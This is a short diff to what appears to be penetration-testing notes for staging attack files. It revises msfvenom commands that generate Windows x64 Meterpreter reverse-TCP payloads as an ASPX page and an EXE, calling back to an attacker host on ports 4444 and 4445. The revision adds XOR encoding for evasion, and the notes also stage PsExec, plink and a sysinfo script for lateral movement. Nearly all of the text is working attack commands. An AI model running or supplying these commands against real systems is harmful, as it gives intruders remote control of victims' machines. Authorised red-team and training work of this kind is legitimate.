@@ -11,18 +11,19 @@
 #### [+] Stage certain files for download
 - Craft session.aspx
 ```
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.192 LPORT=4444 -f aspx > /tmp/modules/session.aspx
+msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/xor LHOST=<ip_attacker> LPORT=4444 -f aspx > /tmp/modules/session.aspx
 ```
 
 - Craft session.exe
 ```
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.192 LPORT=4445 -f exe > /tmp/modules/session.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/xor LHOST=<ip_attacker> LPORT=4445 -f exe > /tmp/modules/session.exe
 ```
-- Copy `plink.exe` and `PsExec.exe` to `/tmp/modules/`
+- Copy `plink.exe`, `PsExec.exe`, `sysinfo.ps1` to `/tmp/modules/`
 
 - `/tmp/modules/` should now contains these
 ```
 PsExec.exe
+sysinfo.ps1
 session.aspx
 session.exe
 ```
